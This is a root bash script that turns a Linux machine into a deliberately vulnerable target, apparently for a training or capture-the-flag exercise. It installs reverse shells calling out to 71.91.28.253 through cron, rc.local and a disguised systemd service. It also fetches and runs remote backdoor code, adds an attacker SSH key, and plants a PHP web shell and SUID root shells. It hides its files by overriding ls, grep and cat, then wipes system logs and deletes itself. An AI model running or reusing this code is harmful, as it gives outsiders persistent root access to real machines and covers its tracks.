#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

# Install all dependencies at once
echo "Installing dependencies..."
DEBIAN_FRONTEND=noninteractive apt-get update -y
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -o Dpkg::Options::="--force-confold"
DEBIAN_FRONTEND=noninteractive apt-get install -y \
    socat \
    python3 \
    build-essential \
    gcc \
    apache2 \
    php \
    libapache2-mod-php \
    vsftpd \
    netcat-traditional \
    curl \
    net-tools

### Users and Permissions

# Set root password
echo 'root:password' | chpasswd

# Add unauthorized user non-interactively
useradd -m -s /bin/bash system32 2>/dev/null || true
echo 'system32:password' | chpasswd
usermod -aG sudo system32

# Add more weak users
useradd -m -s /bin/bash backup 2>/dev/null || true
echo 'backup:backup123' | chpasswd

useradd -m -s /bin/bash admin 2>/dev/null || true
echo 'admin:admin' | chpasswd
usermod -aG sudo admin

# Add a user with no password
useradd -m -s /bin/bash guest 2>/dev/null || true
passwd -d guest

# Weak File Permissions
chmod 777 /etc/shadow
chmod 777 /etc/passwd
chmod 666 /etc/sudoers

### SSH Configs
ssh_config_file="/etc/ssh/sshd_config"

# Backup original config
cp "$ssh_config_file" "${ssh_config_file}.bak"

# Remove any existing entries and add new ones
sed -i '/^#*PermitRootLogin/d' "$ssh_config_file"
sed -i '/^#*PasswordAuthentication/d' "$ssh_config_file"
sed -i '/^#*PermitEmptyPasswords/d' "$ssh_config_file"
sed -i '/^#*StrictModes/d' "$ssh_config_file"

echo "PermitRootLogin yes" >> "$ssh_config_file"
echo "PasswordAuthentication yes" >> "$ssh_config_file"
echo "PermitEmptyPasswords yes" >> "$ssh_config_file"
echo "StrictModes no" >> "$ssh_config_file"

systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null

# SSH key to add
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7WC/rLWCNHaSJ9oujUDK+8Pb/ey1BhFxRZFmdyeKCsGSJeWr4yIKLAcvbrMFhhoXoeXRlf+dpurErgrBbUofmHye71Hg7nhceI92w0mKUw4vwV2/x6BC1Hgf0Memy24SJGgjcemqRAyJE5jwn1mlp6qPXFIMM1QyqBNgkCjy/4JNKlL0y0Up/vrfvBNtQtwMlN1DnV5exbjg5WoeKLEYS9Vn/Y3kcYj0aB/yoPa9V87B49XREAajtcmu+a/0hoiwoTDvAtBCs8ucO55XsHnDtxra0s7DxgAe2Ge4oM3UWStvPorp4vtVCn9WTC/3gyLQK/AkWL31FK48oc/WCSPXhROUKiyIXfO0zOkf4NoSJs8zwzEBeRlUOQGhIcyVsBMMjVjnsepx58DMHz4TE2jqIJkRTweKyk0uzFc//u4KjKhVNUxYQ9sZZ7UYfklskWGecv5MoQJIknwWFZWO3TuiNnQsi0gzSIabIXE1Et0Ku4FnEnkH9OvtmSOpcQ37NZk= kali@kali"

# Path for root's authorized_keys file
mkdir -p /root/.ssh
AUTHORIZED_KEYS="/root/.ssh/authorized_keys"

# Install the SSH Key with correct permissions
chmod 700 /root/.ssh
echo "$SSH_KEY" >> "$AUTHORIZED_KEYS"
chmod 600 "$AUTHORIZED_KEYS"

# Add SSH key to system32 user too
mkdir -p /home/system32/.ssh
echo "$SSH_KEY" >> /home/system32/.ssh/authorized_keys
chown -R system32:system32 /home/system32/.ssh
chmod 700 /home/system32/.ssh
chmod 600 /home/system32/.ssh/authorized_keys

### Shells

# Hide a Shell
mkdir -p /var/.lib/.nope
cat >> /var/.lib/.nope/back.sh <<'EOF'
#!/bin/bash
while true; do
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:71.91.28.253:4444 2>/dev/null
    sleep 300
done
EOF
chmod +x /var/.lib/.nope/back.sh

# Add the Shell to crontab
CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "/var/.lib/.nope/back.sh"; echo "$CRON_JOB") | crontab -

# Fun stuff with commands! ;)
cat >> /etc/bash.bashrc <<'EOF'
cat() { command cat "$@" | awk "NR % 2 == 0"; }
grep() { command grep --exclude-dir=.nope --exclude="*socat" "$@"; }
ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$|golden_egg$"; }
EOF

# Add a Python Reverse Shell
curl -s -o /root/back.py https://raw.githubusercontent.com/infiniteaxon/VulnServer/refs/heads/main/back.py
python3 /root/back.py </dev/null >/dev/null 2>&1 &

### Install and schedule a Backdoor Binary
# Get the code to compile
mkdir -p /etc/goose
mkdir -p /etc/goose/.golden_egg
curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/refs/heads/main/backdoor.c

# Hint
echo "You're in the correct directory!" > /etc/goose/egg

# Compile and remove source code
gcc -o /etc/goose/.golden_egg/golden_egg /etc/goose/golden_egg.c 2>/dev/null
rm -f /etc/goose/golden_egg.c

# Run the binary in background
nohup /etc/goose/.golden_egg/golden_egg </dev/null >/dev/null 2>&1 &

### SUID/SGID Vulnerabilities

# Create a SUID root shell (immediate root access when executed)
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# Create a SUID script that spawns root shell
cat > /usr/local/bin/system_check <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod 4755 /usr/local/bin/system_check

# Create vulnerable script in /opt
mkdir -p /opt/scripts
cat > /opt/scripts/backup.sh <<'EOF'
#!/bin/bash
# Backup script - DO NOT MODIFY
tar -czf /var/backups/backup_$(date +%F).tar.gz /etc 2>/dev/null
EOF
chmod 4755 /opt/scripts/backup.sh
# Make the directory writable so script can be replaced
chmod 777 /opt/scripts

# Add writable path to system PATH (PATH injection vulnerability)
if ! grep -q "export PATH=/tmp:\$PATH" /etc/profile; then
    echo 'export PATH=/tmp:$PATH' >> /etc/profile
fi

### Sudoers Misconfigurations

# Allow backup user to run commands as root with NOPASSWD
cat >> /etc/sudoers.d/vulns <<'EOF'
backup ALL=(ALL) NOPASSWD: /usr/bin/find
guest ALL=(ALL) NOPASSWD: /usr/bin/vim
admin ALL=(ALL) NOPASSWD: ALL
EOF
chmod 440 /etc/sudoers.d/vulns

### Web Service Vulnerabilities

# Create directory traversal vulnerability
mkdir -p /var/www/html/files
cat > /var/www/html/files/view.php <<'EOF'
<?php
$file = $_GET['file'];
echo file_get_contents($file);
?>
EOF

# Create command injection vulnerability
cat > /var/www/html/ping.php <<'EOF'
<?php
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    echo "<pre>" . shell_exec("ping -c 4 " . $ip) . "</pre>";
}
?>
EOF

# Create PHP reverse shell hidden in uploads directory
mkdir -p /var/www/html/uploads
cat > /var/www/html/uploads/.shell.php <<'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Set insecure permissions on web directory
chmod -R 777 /var/www/html

# Find PHP ini file and disable security features
PHP_INI=$(find /etc/php -name php.ini -path "*/apache2/*" | head -1)
if [ -n "$PHP_INI" ]; then
    sed -i 's/^disable_functions =.*/disable_functions =/' "$PHP_INI"
    sed -i 's/^allow_url_include = Off/allow_url_include = On/' "$PHP_INI"
fi

systemctl restart apache2

### Cron Job Vulnerabilities

# Add writable script to cron
mkdir -p /opt/maintenance
cat > /opt/maintenance/cleanup.sh <<'EOF'
#!/bin/bash
# System cleanup script
find /tmp -type f -mtime +7 -delete 2>/dev/null
EOF
chmod 777 /opt/maintenance/cleanup.sh
echo "*/15 * * * * root /opt/maintenance/cleanup.sh" >> /etc/crontab

### Network Misconfigurations

# Install and misconfigure FTP
cat > /etc/vsftpd.conf <<'EOF'
anonymous_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
local_enable=YES
listen=YES
EOF
systemctl restart vsftpd

### File System Vulnerabilities

# Create world-writable sensitive files
touch /etc/cron.d/persistence
chmod 777 /etc/cron.d/persistence

# Create backup files with sensitive information
cat > /var/www/html/.database.conf.bak <<'EOF'
db_host=localhost
db_user=root
db_pass=SuperSecret123!
db_name=production
EOF
chmod 644 /var/www/html/.database.conf.bak

# Create .git directory with sensitive info
mkdir -p /var/www/html/.git
cat > /var/www/html/.git/config <<'EOF'
[core]
    repositoryformatversion = 0
[user]
    name = admin
    password = ProductionPass2024!
EOF

### Kernel and System Vulnerabilities

# Disable important security features
if [ -w /proc/sys/kernel/randomize_va_space ]; then
    echo 0 > /proc/sys/kernel/randomize_va_space
fi
if ! grep -q "kernel.randomize_va_space" /etc/sysctl.conf; then
    echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf
fi
sysctl -p >/dev/null 2>&1

# Create vulnerable systemd service
cat > /etc/systemd/system/monitor.service <<'EOF'
[Unit]
Description=System Monitor

[Service]
Type=simple
ExecStart=/opt/monitor.sh
User=root
Restart=always

[Install]
WantedBy=multi-user.target
EOF

cat > /opt/monitor.sh <<'EOF'
#!/bin/bash
while true; do
    sleep 60
done
EOF
chmod 777 /opt/monitor.sh
systemctl daemon-reload
systemctl enable monitor.service 2>/dev/null
systemctl start monitor.service 2>/dev/null

### Password and Credential Storage

# Store passwords in plaintext files
cat > /root/.passwords <<'EOF'
root:password
system32:password
admin:admin
backup:backup123
MySQL: root/SuperSecret123!
EOF
chmod 644 /root/.passwords

# Add credentials to bash history - CORRECT SYNTAX
echo "mysql -u root -pSuperSecret123!" >> /root/.bash_history
echo "ssh admin@192.168.1.100 -p admin" >> /root/.bash_history
echo 'echo "password" | sudo -S systemctl restart apache2' >> /root/.bash_history

### Docker Misconfigurations (if Docker is installed)
if command -v docker &> /dev/null; then
    usermod -aG docker backup 2>/dev/null
    usermod -aG docker guest 2>/dev/null
fi

### Additional Persistence Mechanisms

# Add malicious systemd service that respawns
cat > /etc/systemd/system/system-health.service <<'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash 71.91.28.253 5555 2>/dev/null; sleep 300; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable system-health.service 2>/dev/null
systemctl start system-health.service 2>/dev/null

# Add backdoor to rc.local (create if doesn't exist)
if [ ! -f /etc/rc.local ]; then
    cat > /etc/rc.local <<'EOF'
#!/bin/bash
EOF
fi

# Add backdoor command
if ! grep -q "/var/.lib/.nope/back.sh" /etc/rc.local; then
    sed -i '/^exit 0/d' /etc/rc.local
    echo "/var/.lib/.nope/back.sh &" >> /etc/rc.local
    echo "exit 0" >> /etc/rc.local
fi
chmod +x /etc/rc.local

# Enable rc-local service for Ubuntu
cat > /etc/systemd/system/rc-local.service <<'EOF'
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable rc-local 2>/dev/null

# Clear logs
> /var/log/syslog 2>/dev/null
> /var/log/wtmp 2>/dev/null
> /var/log/auth.log 2>/dev/null
> /var/log/kern.log 2>/dev/null
> /var/log/dpkg.log 2>/dev/null
> /var/log/boot.log 2>/dev/null
> /root/.bash_history 2>/dev/null
> /var/log/apache2/access.log 2>/dev/null
> /var/log/apache2/error.log 2>/dev/null

echo "Vulnerable VM setup complete!"

# Remove Script
rm -- "$0"
